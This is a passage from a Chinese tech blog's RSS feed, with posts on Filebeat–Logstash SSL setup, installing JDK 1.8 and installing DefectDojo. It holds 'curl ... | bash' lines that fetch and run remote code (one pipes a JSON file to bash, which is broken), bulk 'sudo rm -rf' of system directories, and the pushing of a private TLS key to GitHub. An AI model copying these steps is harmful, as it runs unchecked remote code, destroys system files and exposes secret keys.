logstash<span class="token comment" spellcheck="true">#查看logstash进程</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新启动logstash，这里不要以后台方式运行，直接运行下面命令，如果出错可以看到错误信息。没有出错信息就继续往下（不要用systemctl start logstash启动方式，因为该方式不会加载logstash.conf配置文件启动）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）带证书访问logstash</p><p> 在运行Filebeat之前 ,另外开个终端，<a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html#testing-ssl-logstash">带证书访问</a>，可以使用curl来验证logstash证书是否成功（启动logstash后，再带证书访问时，可能会有延迟，多试几次）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#带证书访问：</span>curl -v --cacert /etc/logstash/certs/ca.crt https://域名:5044curl -v --cacert /etc/logstash/certs/ca.crt https://ip:5044curl -v --cacert /etc/filebeat/certs/ca.crt https://10.65.18.112:5044curl -v --cacert /etc/filebeat/certs/ca.crt https://archery-sec0002.eniot.io:5044<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回如下信息则连接成功：</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615364370400.png" alt="1615364370400"></p><p>返回如下信息则连接失败：<img src="/2021/02/19/install-guide-elk-filebeats/1615364645594.png" alt="1615364645594"></p><p>（5）后台方式运行logstash</p><p>证书访问成功后，即可以后台方式长时间运行logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-2-2-复制filebeat证书"><a href="#6-2-2-复制filebeat证书" class="headerlink" title="6.2.2 复制filebeat证书"></a>6.2.2 复制filebeat证书</h3><p>因为之前的证书都是再logstash主机上生成的，因此我们需要吧filebeat相关证书（ca.crt,filebeat.crt,filebeat.key）从logstash主机复制filebeat主机。这里如果知道主机账户密码可以直接用scp命令，直接看6.2.3节。因为我使用的是堡垒机，不知道主机密码，因为我开始使用的是堡垒机文件夹的上传下载功能，突然发现堡垒机的这个功能有巨坑：上传下载有大小限制，所以这样传过去的证书是不完整的，用起来会一直报no pem file /etc/filebeat/certs/filebeat.crt; file is not a certificate adding/etc/filebeat/certs/ca.pem to the list of known CAs错误，这个真的坑死我了，弄了好久才发现。后面尝试用git来运输文件。</p><h4 id="6-2-2-1-logstash主机上传文件到git"><a href="#6-2-2-1-logstash主机上传文件到git" class="headerlink" title="6.2.2.1 logstash主机上传文件到git"></a>6.2.2.1 logstash主机上传文件到git</h4><p>上传ca.crt  filebeat.key filebeat.crt，3个文件到git：</p><p>（1）进入证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/logstash/certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）下载git项目(随便建一个，或者用已经存在的)，并ca.crt  filebeat.key filebeat.crt将复制到项目文件夹gitalk</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/m01ly/gitalk<span class="token function">cp</span> filebeat.crt gitalk/<span class="token function">cp</span> ca.crt gitalk/<span class="token function">cp</span> filebeat.key gitalk/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365664125.png" alt="1615365664125"></p><p>（2）添加所有需要上传的文件和配置到git</p><p>git add FILE添加确定的文件FILE<br>git add .添加当前目录下所有文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> gitalk<span class="token punctuation">[</span>root@xxxx gitalk<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git add .</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）提交文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> commit -m <span class="token string">'filebeat log message'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365765658.png" alt="1615365765658"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">rm</span> origin<span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> push -u origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365843590.png" alt="1615365843590"></p><p>网页访问git，发现文件上传成功</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365900784.png" alt="1615365900784"></p><h4 id="6-2-2-2-filebeat主机从git下载文件"><a href="#6-2-2-2-filebeat主机从git下载文件" class="headerlink" title="6.2.2.2 filebeat主机从git下载文件"></a>6.2.2.2 filebeat主机从git下载文件</h4><p>以下全程再filebeat主机上操作。</p><p>（1）进入证书目录，下载git项目</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/filebeat/<span class="token function">git</span> clone https://github.com/m01ly/gitalk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）修改文件夹gitalk为certs，可以看到filebeat相关证书已经下载成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> gitalk certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366185610.png" alt="1615366185610"></p><h3 id="6-2-3-filebeat配置证书"><a href="#6-2-3-filebeat配置证书" class="headerlink" title="6.2.3 filebeat配置证书"></a>6.2.3 filebeat配置证书</h3><p>（1）配置证书</p><p>配置/etc/filebeat/filebeat.yml 文件，在output.logstash节点加上3行ssl相关参数为证书路径如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /etc/filebeat/filebeat.yml /etc/filebeat/filebeat0.yml<span class="token function">vi</span> /etc/filebeat/filebeat.yml output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"archery-sec0002.eniot.io:5044"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#这里配置logstash地址，如果是内网最好用域名访问</span>  ssl.certificate_authorities: <span class="token punctuation">[</span><span class="token string">"/etc/filebeat/certs/ca.crt"</span><span class="token punctuation">]</span>  ssl.certificate: <span class="token string">"/etc/filebeat/certs/filebeat.crt"</span>  ssl.key: <span class="token string">"/etc/filebeat/certs/filebeat.key"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）重启filebeat</p><p>运行下面命令启动filebeat（用以下方式启动的原因是因为报错的时候，方便看日志，如果采用systemctl restart filebeat方式启动，如果启动失败，日志不好找，参考<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以 看到日志中有Connection to backoff(async(tcp://xx.xx.io:5044)) established信息，则表示连接成功。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615358106512.png" alt="1615358106512"></p><h1 id="7-树莓派上装filebeat"><a href="#7-树莓派上装filebeat" class="headerlink" title="7 树莓派上装filebeat"></a>7 树莓派上装filebeat</h1><p>在实际生产项目中，收集日志的可能都是简单的树莓派系统，因此我也尝试再树莓派上安装filebeat，按照网上的一篇教程在<a href="https://www.jianshu.com/p/979663160cb2">Raspberry PI 3上安装Filebeat</a>，博主写的很详细，照着做就可以，这里面有个坑需要提一下，在make update是会报错如下图：一片红，根据描述信息可以看出是python版本不符合，谷歌了一波也没得到解决，然后忽略他，继续安装启动filebeat正常。这里的错误有人可以解决的话，可以写在评论区一起交流。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615879776960.png" alt="1615879776960"></p><p>注意二：</p><p>用/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -v来启动filebeat，自己尝试/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat语句 会无回显，启动失败。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /lib/systemd/system/filebeat.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[Unit]Description=filebeatDocumentation=https://www.elastic.co/guide/en/beats/filebeat/current/index.htmlWants=userwork-online.targetAfter=network-online.target[Service]ExecStart=/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -vRestart=always[Install]WantedBy=multi-user.target</code></pre><h1 id="8-Kibana查看上传的日志"><a href="#8-Kibana查看上传的日志" class="headerlink" title="8  Kibana查看上传的日志"></a>8  Kibana查看上传的日志</h1><p>（1）建立索引模式</p><p>登录kibana，然后点击链接“stack Management”→”index patterns”–&gt;”Create index pattern”–&gt;输入filebeats-*，然后一直next完成即创建索引模式成功。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382014523.png" alt="1618382014523"></p><p>（2）查看上传的日志内容</p><p>Home-&gt;”Discover”–选中所建立的index pattern，就可以看到上传的日志信息。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382093420.png" alt="1618382093420"></p><p>（3）筛选上传的日志信息</p><p>在下图1处 输入 筛选表达式对日志进行筛选，然后按enter或者右边的update按钮，即可看到过滤后的数据。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382258008.png" alt="1618382258008"></p><h1 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h1><ol><li><p><a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/">elk笔记一—suricata+elk搭建入侵检测系统</a></p></li><li><p><a href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a></p></li><li><p><a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">centos7中安装suricata</a></p></li></ol><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol><li><p><a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html">使用SSL与Logstash进行安全通信官方配置</a>  官方配置</p></li><li><p><a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>  很有用</p></li><li><p><a href="https://www.cnblogs.com/galsnag/articles/10144170.html">filebeat与logstash实现ssl加密传输 </a>第1次参考方案</p></li><li><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a>  第二次参考方案-目前 直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书 </p></li><li><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">filebeat.yml配置文件详细说明</a> 当字典检索</p></li><li><p><a href="https://blog.csdn.net/vip100549/article/details/79657574">使用Filebeat 6 收集多个目录的日志并发送到lostash</a></p></li><li><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p></li><li><p><a href="https://www.jianshu.com/p/f5f93c89155e">openssl 查看证书</a>  制作过程中可以检验，我传输的证书有缺陷就是用这个检验出来的</p></li><li><p><a href="https://blog.csdn.net/cowbin2012/article/details/100134114">证书具体参数说明</a></p></li><li><p><a href="https://ningyu1.github.io/site/post/51-ssl-cert/">Openssl生成自签名证书的多种方式</a>  本文生成证书参考的</p></li><li><p><a href="https://mp.weixin.qq.com/s/qm8bmJPfH8kC9yHDqxL6aA">威胁狩猎：基于ELK的日志监控</a>  值得看的结构   后面再看看</p></li><li><p><a href="https://www.elastic.co/cn/blog/configuring-ssl-tls-and-https-to-secure-elasticsearch-kibana-beats-and-logstash#run-filebeat">配置 SSL、TLS 以及 HTTPS 来确保 Elasticsearch、Kibana、Beats 和 Logstash 的安全</a>  官网参考配置   后面再看看</p></li><li><p><a href="https://www.jianshu.com/p/979663160cb2">Raspberry PI 3上安装Filebeat</a>]翻译自<a href="https://www.programmersought.com/article/31601555670/">Install Filebeat on Raspberry PI 3</a> 本文参考</p></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/">日志管理</category>
      
      
      <comments>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux安装jdk1.8</title>
      <link>https://m01ly.github.io/2021/02/18/linux-jdk8/</link>
      <guid>https://m01ly.github.io/2021/02/18/linux-jdk8/</guid>
      <pubDate>Thu, 18 Feb 2021 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;很多软件的安装都需要java8的环境，如何再Linux安装java8环境呢？&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>很多软件的安装都需要java8的环境，如何再Linux安装java8环境呢？</p><a id="more"></a><h1 id="1-查看旧版本"><a href="#1-查看旧版本" class="headerlink" title="1 查看旧版本"></a>1 查看旧版本</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604406880320.png" alt="1604406880320"></p><h1 id="2-替换成1-8版本"><a href="#2-替换成1-8版本" class="headerlink" title="2 替换成1.8版本"></a>2 替换成1.8版本</h1><p>可以发现本机上有两个java，但是目前使用的是1.7的，直接修改/etc/profile配置文件，讲JAVA_HOME修改为1.8jdk所在的路径即可。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603862700214.png" alt="1603862700214"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604407037055.png" alt="1604407037055"></p><p>这里可以看到centos7自带的仅仅是jre，并没有装jdk，此时最好卸载自带的重新安装jdk8</p><h2 id="3-重新安装1-8"><a href="#3-重新安装1-8" class="headerlink" title="3 重新安装1.8"></a>3 重新安装1.8</h2><p>若原主机没有1.8版本，则此时需要先卸载旧版本，再安装1.8版本。</p><h2 id="3-1-卸载旧版本"><a href="#3-1-卸载旧版本" class="headerlink" title="3.1 卸载旧版本"></a>3.1 卸载旧版本</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum remove java-1.8.0-openjdk#采用yum install -y java-1.8.0-openjdk方式安装的卸载方法</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装1-8版本java"><a href="#3-2-安装1-8版本java" class="headerlink" title="3.2 安装1.8版本java"></a>3.2 安装1.8版本java</h2><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，<strong>而那个不带-devel的安装完了其实是jre。</strong> </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603870468396.png" alt="1603870468396"></p><h2 id="3-3-修改环境变量"><a href="#3-3-修改环境变量" class="headerlink" title="3.3 修改环境变量"></a>3.3 修改环境变量</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603867783946.png" alt="1603867783946"></p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/02/18/linux-jdk8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DefectDojo安装与使用</title>
      <link>https://m01ly.github.io/2021/01/21/esc-DefectDojo/</link>
      <guid>https://m01ly.github.io/2021/01/21/esc-DefectDojo/</guid>
      <pubDate>Thu, 21 Jan 2021 02:22:45 GMT</pubDate>
      
      <description>&lt;p&gt;最近老板要求建设资产管理与服务软件，团队人员少，只能找找开源的啦，DefectDojo基于Django框架可以搭建看看&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近老板要求建设资产管理与服务软件，团队人员少，只能找找开源的啦，DefectDojo基于Django框架可以搭建看看</p><a id="more"></a><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><h2 id="1-1-官方文档"><a href="#1-1-官方文档" class="headerlink" title="1.1 官方文档"></a>1.1 官方文档</h2><p>github地址:<a href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a></p><p>官方文档:<a href="https://defectdojo.readthedocs.io/en/latest/about.html">https://defectdojo.readthedocs.io/en/latest/about.html</a></p><h2 id="1-2-环境版本"><a href="#1-2-环境版本" class="headerlink" title="1.2 环境版本"></a>1.2 环境版本</h2><h3 id="1-2-1-docker-compose"><a href="#1-2-1-docker-compose" class="headerlink" title="1.2.1 docker-compose"></a>1.2.1 docker-compose</h3><p>使用docker-compose进行安装至少需要docker 18.09.4和docker-compose 1.22.0,如果没有安装,则按照下面命令安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/bin/<span class="token function">wget</span> https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64<span class="token function">rename</span> docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64<span class="token function">chmod</span> +x /usr/local/bin/docker-compose./docker-compose version<span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose<span class="token comment" spellcheck="true">#加个软连接</span>docker-compose version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1611195834714.png" alt="1611195834714"></p><h3 id="1-2-2-python版本3之上"><a href="#1-2-2-python版本3之上" class="headerlink" title="1.2.2 python版本3之上"></a>1.2.2 python版本3之上</h3><p><img src="/2021/01/21/esc-DefectDojo/1611652410659.png" alt="1611652410659"></p><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h1><h2 id="2-1-下载安装"><a href="#2-1-下载安装" class="headerlink" title="2.1 下载安装"></a>2.1 下载安装</h2><p>执行下面的命令,进行安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/DefectDojo/django-DefectDojo<span class="token function">cd</span> django-DefectDojo<span class="token comment" spellcheck="true"># building</span>docker-compose build<span class="token comment" spellcheck="true"># running</span>docker-compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行docker-compose build时候,会报错如下:(如果build有错,也可直接up就行)</strong></p><p>curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</p><p><img src="/2021/01/21/esc-DefectDojo/1611211553110.png" alt="1611211553110"></p><p><a href="https://github.com/hawtim/blog/issues/10">解决办法</a>：</p><p><img src="/2021/01/21/esc-DefectDojo/1611211540151.png" alt="1611211540151"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/hosts<span class="token comment" spellcheck="true">#编辑hosts,添加如下映射</span>199.232.96.133 raw.githubusercontent.com199.232.96.133 user-images.githubusercontent.com199.232.96.133 avatars2.githubusercontent.com199.232.96.133 avatars1.githubusercontent.com/etc/init.d/networking restart<span class="token comment" spellcheck="true">#重启网络</span><span class="token function">service</span> network restart<span class="token comment" spellcheck="true">#或者这种方法重启网络</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以访问下面几个网址测试是否修改成功,</p><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://raw.githubusercontent.com/pyupio/safety-db/master/data/insecure_full.json <span class="token operator">|</span> <span class="token function">bash</span> -s stablecurl -L https://get.rvm.io <span class="token operator">|</span> <span class="token function">bash</span> -s stable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1612339821470.png" alt="1612339821470"></p><p><img src="/2021/01/21/esc-DefectDojo/1611643936373.png" alt="1611643936373"></p><h2 id="2-2-登录"><a href="#2-2-登录" class="headerlink" title="2.2 登录"></a>2.2 登录</h2><p>安装后的初始密码会出线再log里面,直接用下面命令进行查找.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># use docker-compose logs -f initializer to track progress</span>docker-compose logs initializer <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Admin password:"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果显示如下用户密码已经存在,但是自己忘记密码了密码,可以重新创建新用户及密码</p><p><img src="/2021/01/21/esc-DefectDojo/1612340052892.png" alt="1612340052892"></p><pre class="line-numbers language-bash"><code class="language-bash">docker-compose <span class="token function">exec</span> uwsgi /bin/bash -c <span class="token string">'python manage.py createsuperuser'</span><span class="token comment" spellcheck="true">#创建新的超级用户和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问: <a href="http://localhost:8080/%E6%88%96%E8%80%85http://10.27.22.92:8080/dashboard">http://localhost:8080/或者http://10.27.22.92:8080/dashboard</a></p><p><img src="/2021/01/21/esc-DefectDojo/1612340217583.png" alt="1612340217583"></p><h1 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://owasp.org/www-pdf-archive/Defectdojo-owasp-stammtisch-final.pdf">Defectdojo架构</a></p><p><a href="https://readthedocs.org/projects/defectdojo/downloads/pdf/latest/">相关文档pdf</a></p><p><a href="https://github.com/DefectDojo/django-DefectDojo/issues/2018">Defectdojo问题列表解决</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">企业安全建设</category>
      
      
      <comments>https://m01ly.github.io/2021/01/21/esc-DefectDojo/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>大数据实践（一）数仓采集项目</title>
      <link>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/</link>
      <guid>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/</guid>
      <pubDate>Mon, 23 Nov 2020 07:10:21 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-数仓概念"><a href="#1-数仓概念" class="headerlink" title="1 数仓概念"></a>1 数仓概念</h1><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637651564709.png" alt="1637651564709"></p><h1 id="2-项目需求及架构设计"><a href="#2-项目需求及架构设计" class="headerlink" title="2 项目需求及架构设计"></a>2 项目需求及架构设计</h1><h2 id="2-1-项目需求分析"><a href="#2-1-项目需求分析" class="headerlink" title="2.1 项目需求分析"></a>2.1 项目需求分析</h2><p>1）用户行为数据采集平台搭建（存在日志服务器-用flume采集到数据仓库（hdfs）中）<br>2）业务数据采集平台搭建（存在mysql,oracle）：通过sqoop采集到数据仓库（hdfs）中<br>3）数据仓库维度建模：建库建表<br>4）分析，设备 会员 商品 地区 活动等电商核心主题，统计的报表指标近100个。<br>5）采用即席查询工具，随时进行指标分析<br>6）对集群性能进行监控，发送异常需要报警<br>7）元数据管理：管理Hive的元数据(数仓的核心就是hive)<br>8）质量监控：数仓分析的质量 有没有丢数据等</p><h2 id="2-2-项目框架"><a href="#2-2-项目框架" class="headerlink" title="2.2 项目框架"></a>2.2 项目框架</h2><h3 id="2-2-1-技术选型"><a href="#2-2-1-技术选型" class="headerlink" title="2.2.1 技术选型"></a>2.2.1 技术选型</h3><p>技术选型主要考虑因素：数据量大小，业务需求，行业内经验，技术成熟度、开发维护成本、总成本预算。下面加粗的是本次选择的。</p><ul><li>数据采集传输：<strong>Flume</strong>,Logstash(elk系列),<strong>Kafka</strong>,<strong>Sqoop</strong>（开源的）,DataX（阿里技术，比Sqoop强大）</li><li>数据存储：<strong>Mysq</strong>,<strong>HDFS</strong>,HBase,Redis,MongoDB</li><li>数据计算：<strong>Hive</strong>,Tez,<strong>Spark</strong>,Flink,Storm(Hive底层用Tex或者Spark)，Storm较早 不用</li><li>数据查询：<strong>Presto</strong>,<strong>Kylin</strong>（Apache）,Impala,Druid</li><li>数据可视化：Echarts（百度的，现在已经是Apache的了）,<strong>Superset</strong>（开源）,QuickBI,DataV（后两个都是阿里）</li><li>任务调度：<strong>Azkaban</strong>(Apache的，可视化界面),Oozie（CDH生态，HUE，功能比azkaban强大）</li><li>集群监控：<strong>Zabbix</strong></li><li>元数据管理：<strong>Atlas</strong></li></ul><h3 id="2-2-2-系统数据流程设计"><a href="#2-2-2-系统数据流程设计" class="headerlink" title="2.2.2 系统数据流程设计"></a>2.2.2 系统数据流程设计</h3><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637652372079.png" alt="1637652372079"></p><p>多个Flume往HDFS中写数据，会有压力，因此中间部署Kafka，来缓冲。</p><p>Hive通过写sql对数据进行处理，主要有5层处理，分别是ods,dwd,dws,dwt,ads。</p><p>对整个仓库的任务：利用什么时候导入数据等用Azkaban来调度。</p><h3 id="2-2-3-框架版本选型"><a href="#2-2-3-框架版本选型" class="headerlink" title="2.2.3 框架版本选型"></a>2.2.3 框架版本选型</h3><p>  